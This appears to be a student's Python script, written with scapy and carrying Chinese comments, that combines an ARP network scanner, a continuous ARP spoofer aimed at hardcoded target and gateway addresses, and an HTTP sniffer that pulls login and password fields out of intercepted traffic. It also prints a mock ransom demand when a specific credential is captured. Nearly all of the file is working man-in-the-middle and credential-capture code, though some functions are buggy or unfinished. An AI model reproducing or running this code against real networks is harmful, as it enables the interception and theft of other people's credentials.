import scapy.all as scapy
import time
import argparse
from scapy_http import http


gateway_ip = "192.168.146.236" 
target_ip = "192.168.206.143"

#   Sniff.py
def sniff(interface):
    # print("vsvs")
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    # print("xoxo")
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname",
                    "user", "login",
                    "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode("utf-8"))

        login_info = get_login_info(packet)
        if login_info:
            # print("hihi")
            print("\n\n[+] Possible username/password > "
                  + login_info.decode()
                  + "\n\n")
            if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
                print("You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever")
                arp_request = scapy.ARP(pdst = "192.168.206.1")
                broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
                ippkt = scapy.IP(dst="192.168.206.101",ttl=10)
                tcp = scapy.TCP(sport=8888, dport=80)
                payload="stfu2"
                arp_request_broadcast = broadcast / arp_request/ippkt/tcp/payload
                
                print(arp_request_broadcast.payload.layers())
                #rawPayload = (arp_request_broadcast.getlayer(scapy.IP).version)
                #rawPayload = arp_request_broadcast.layers()
                arp_request_broadcast.getlayer(scapy.packet.Raw).load="stfu3"
                rawPayload = (arp_request_broadcast.getlayer(scapy.packet.Raw).load)

                print(rawPayload)
#   =============================================================
#   Scan.py
def get_argments():
    parser = argparse.OptionParser()
    parser.add_option("-t", "--target", dest="target",
    help="Target IP / IP range") #當使用者在終端機執行 python3 main.py -target gateway_ip/24，期望在終端機看到輸出看到IP range。
    options = parser.parse_args() #解析使用者輸入的值
    return options

def scan(ip):
    #Create ARP request directed to broadcast MAC asking for IP#
    arp_request = scapy.ARP(pdst=ip)  #only need for IP Field
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  #利用scapy模組的Ether物件
    arp_request_broadcast = broadcast/arp_request  #把arp_request跟broadcast混合，發送此混合封包，然後它會自動送到廣播的MAC address，去詢問我們想知道的IP位址
    #----------------------------------------------------------#
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  #Send packet and receive response
    
    client_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)
    return client_list  
    
    
def print_result(list):   #Parse the response
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    for client in list:
        print(client["ip"] + "\t\t" + client["mac"])
#   =============================================================              
      
        

#   Spoofing
def get_mac(ip):
    #Create ARP request directed to broadcast MAC asking for IP#
    arp_request = scapy.ARP(pdst=ip)  #only need for IP Field
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  #利用scapy模組的Ether物件
    arp_request_broadcast = broadcast/arp_request  #把arp_request跟broadcast混合，發送此混合封包，然後它會自動送到廣播的MAC address，去詢問我們想知道的IP位址
    #----------------------------------------------------------#
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  #Send packet and receive response
    if answered_list == "":
        return (answered_list[0][1].hwsrc)  

def spoof(target_ip, spoof_ip): #輸入目標的IP, 我們假裝的IP
    target_mac = get_mac(target_ip) #call 已寫好的get_mac的function
    packet = scapy.ARP(op=2, pdst=target_ip,
    hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) #發送封包

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                            hwdst=destination_mac,
                            psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    
def action(packet):
   # pakt[iter]=packet
    #print(pakt[iter])
    
    print("7")
    print(packet.src)
    print(packet.getlayer(scapy.packet.Raw).load)
#   =============================================================    


#   display all the subnetwork of the gateway
  
scan_result = scan(gateway_ip+"/24")    #可拿到所有子網路的封包回應
print_result(scan_result)
# ===================================================

#   choose the victim and spoofing
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(2)  # Waits for two seconds
       
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")
# ====================================================

    